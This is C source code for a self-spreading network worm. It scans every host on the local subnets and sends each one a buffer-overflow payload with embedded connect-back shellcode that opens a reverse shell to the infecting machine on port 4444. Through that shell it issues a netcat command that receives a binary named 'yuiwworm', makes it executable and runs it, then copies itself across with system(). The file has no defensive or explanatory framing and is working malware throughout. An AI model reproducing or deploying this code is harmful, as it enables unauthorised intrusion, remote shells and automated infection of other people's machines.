#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sys/socket.h>
#include <ifaddrs.h>
#define BUF_SIZE 1064


char shellcode[] =
    "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
    "\x06\x51\xb1\x01\x51\xb1\x02\x51"
    "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
    "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
    "\x68\x41\x42\x43\x44\x66\x68\xb0"
    "\xef\xb1\x02\x66\x51\x89\xe7\xb3"
    "\x10\x53\x57\x52\x89\xe1\xb3\x03"
    "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
    "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
    "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
    "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
    "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
    "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
    "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
    "\x2f\x62\x69\x89\xe3\x50\x53\x89"
    "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
    "\x01\xcd\x80";


//standard offset 
#define RET 0xbffff284 + 0x90
    
#define FPRINTF fprintf(stderr,
int exploit(char *victimIP, unsigned short victimPort, int *conback_ip){
    char buffer[1064];
    int s, i, size,j;

    struct sockaddr_in remote;

    shellcode[33] = conback_ip[0]; 
    shellcode[34] = conback_ip[1];
    shellcode[35] = conback_ip[2];
    shellcode[36] = conback_ip[3];
    
    shellcode[39] = 17;
    shellcode[40] = 92;


    memset(buffer, 0x90, BUF_SIZE);

    memcpy(buffer+901-sizeof(shellcode) , shellcode, sizeof(shellcode));

    buffer[900] = 0x90;

    for(i=905; i < BUF_SIZE-4; i+=4) { 
        * ((int *) &buffer[i]) = RET;
    }
    buffer[BUF_SIZE-1] = 0x0;

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0){
        FPRINTF "Attack:Error:Socket...");
        return 0;
    }
    
    remote.sin_family = AF_INET;
    inet_aton(victimIP, &remote.sin_addr.s_addr);
    remote.sin_port = htons(victimPort);
  
    if (connect(s, (struct sockaddr *)&remote, sizeof(remote))==-1){
        close(s);
        FPRINTF "Attack:Error:Connect...");
        return 0;
    }

    for(i=0;i<10;i++){
        for(j=905; j < BUF_SIZE-4; j+=4) { 
        * ((int *) &buffer[j]) = RET; 
        }
    }
    
    buffer[BUF_SIZE-1] = 0x0;

    size = send(s, buffer, sizeof(buffer), 0);
    if (size==-1){
        close(s);
        FPRINTF "Attack:Error:Sending...");
        return 0;
    }

    close(s);

    return 1;
}

void splitOctet(char * addr, int *rs){
    rs[0] = 0;
    int i = 0;
    for(i = 0; i < strlen(addr); ++i)
    {
        if(addr[i] != '.')
            *rs = *rs * 10 + addr[i] - 48;
        else
            *(++rs) = 0;
    }
    
    return;
}

int checkIP(int *curadd, int *add, int *net, int i)
{
    return (net[i] & (~add[i]) & (~curadd[i])) | (net[i] & add[i] & curadd[i]) == net[i];
}

int sendData(int *c, char *buffer, char *Data)
{
    int len = strlen(Data), bytes;
    memcpy(buffer, Data, len);
    bytes = send(c, buffer, len, 0);
    if(bytes == -1)
    {
        FPRINTF "sendData:Error:%s...", Data);
        return 0;
    }
    return 1;
}

#define TIMEOUT 20
int count = 0;
pthread_t t_main;

void * timer_thread(int *s)
{
    while (TIMEOUT > count)
    {
        sleep(1);
        count++;
    }
    FPRINTF "Kill Thread...");
    close(s);
    pthread_cancel(t_main);
}

void * Spreading()
{
    pthread_t t_timer;
    struct sockaddr_in srv;
    char buffer[BUF_SIZE];
    int s, c, s_size;
    const opt = 1;
    
    FPRINTF "Listen...");
    s = socket(AF_INET, SOCK_STREAM, 0);
    if(s == -1){
        perror("Spreading:Error:Socket...");
        return;
    }
    
    if (-1 == pthread_create(&t_timer, NULL, timer_thread, s)){
        perror("Spreading:Error:pthread_create");
        return NULL;
    }

    srv.sin_addr.s_addr = INADDR_ANY;
    srv.sin_port = htons((unsigned short int) 4444);
    srv.sin_family = AF_INET;
    
    if(setsockopt(s, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, (char*) &opt, (socklen_t *) sizeof(opt))){
        perror("Spreading:Error:Setsockopt failed: ");
        pthread_join(t_timer, NULL);
        return;
    }
    
    if(bind(s, (struct sockaddr*) &srv, sizeof(srv)) == -1){
        perror("Spreading:Error:Bind failed: ");
        pthread_join(t_timer, NULL);
        return;
    }
    
    if(listen(s, 3) == -1){
        perror("Spreading:Error:Listen failed: ");
        pthread_join(t_timer, NULL);
        return;
    }
    
    s_size=sizeof(srv);
    c = accept(s, (struct sockaddr*) &srv, &s_size);
    if(c == -1){
        perror("Spreading:Error:Accept failed: ");
        close(c); 
        pthread_join(t_timer, NULL); 
        return;
    }
    
    if(!sendData(c, buffer, "nc -q 0 -l 10000>yuiwworm && sleep 2 && chmod a+x yuiwworm && sleep 2 && ./yuiwworm 2>worm_log.txt &\x0A")){
        FPRINTF "Spreading:Error:Exec...");
        close(c); 
        pthread_join(t_timer, NULL); 
        return;
    }
    
    char command[50];
    
    sprintf(command, "nc %s 10000<yuiwworm\n", (char*)inet_ntoa(srv.sin_addr.s_addr));
    system(command);
    
    close(c);
    FPRINTF "Worm Transfer + Execute: SUCCESS...");
    pthread_join(t_timer, NULL);
}

#define SPLIT splitOctet((char*)inet_ntoa(((struct sockaddr_in *) 
#define IFCHECK if(checkIP(curadd, add, net,
void main(int argc, char*argv[]){   
    int i, 
        iret, 
        add[4]          = {0,0,0,0}, 
        net[4]          = {0,0,0,0}, 
        max[4]          = {0,0,0,0}, 
        curadd[4]       = {0,0,0,0}, 
        conback_ip[4]   = {0,0,0,0};
        
    char victim_address[20];
    unsigned short victim_port=5000;
    
    pthread_t thr;
    
    struct ifaddrs *ifap, *ifa;
    struct sockaddr_in *sa;
    
    getifaddrs (&ifap);
    for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr && ifa->ifa_addr->sa_family==AF_INET) {
            
            SPLIT ifa->ifa_addr)->sin_addr), add);
            SPLIT ifa->ifa_netmask)->sin_addr), net);
            FPRINTF "--------------------------------------------\n");
            FPRINTF "Address: %d.%d.%d.%d\n", add[0], add[1], add[2], add[3]);
            FPRINTF "Netmask: %d.%d.%d.%d\n", net[0], net[1], net[2], net[3]);
            FPRINTF "--------------------------------------------\n");
            for(i = 0; i < 4; ++i)
            {
                conback_ip[i] = add[i];
                add[i] &= net[i];
                if(i == 3 && add[i] == 0)
                    add[i] = 1;
                max[i] =  (0x0FF & ~net[i]) | add[i];
                curadd[i] = add[i];
            }
            
            if(!(add[0] == 127 && add[1] == 0 && add[2] == 0 && add[3] == 1) && !(add[0] == 0 && add[1] == 0 && add[2] == 0 && add[3] == 0))
            {
                while(curadd[0] <= max[0])
                {
                    IFCHECK 0))
                    {
                        while(1)
                        {
                            IFCHECK 1))
                            {
                                while(1)
                                {
                                    IFCHECK 2))
                                    {
                                        while(1)
                                        {
                                            IFCHECK 3))
                                            {
                                                iret = pthread_create(&t_main, NULL, Spreading, NULL);
//                                                 printf("%d.%d.%d.%d\n", curadd[0], curadd[1], curadd[2], curadd[3]);
                                                sprintf(victim_address, "%d.%d.%d.%d", curadd[0], curadd[1], curadd[2], curadd[3]);
                                                FPRINTF "%s...", victim_address);
                                                
                                                if(exploit(victim_address, victim_port, conback_ip))
                                                {
                                                    FPRINTF "Attacked...");
                                                    pthread_join(t_main, NULL);
                                                }
                                                else
                                                {
                                                    count = 19;
                                                    pthread_join(t_main, NULL);
                                                    FPRINTF "X");
                                                }
                                                FPRINTF "\n");
                                                count = 0;
                                            }
                                            if(++curadd[3] > max[3])
                                            {
                                                curadd[3] = 0;
                                                break;
                                            }
                                        }
                                    }
                                    if(++curadd[2] > max[2])
                                    {
                                        curadd[2] = 0;
                                        break;
                                    }
                                }
                            }
                            if(++curadd[1] > max[1])
                            {
                                curadd[1] = 0;
                                break;
                            }
                        }
                    }
                    ++curadd[0];
                }
            }
        }
    }
    freeifaddrs(ifap);
//    return;
}
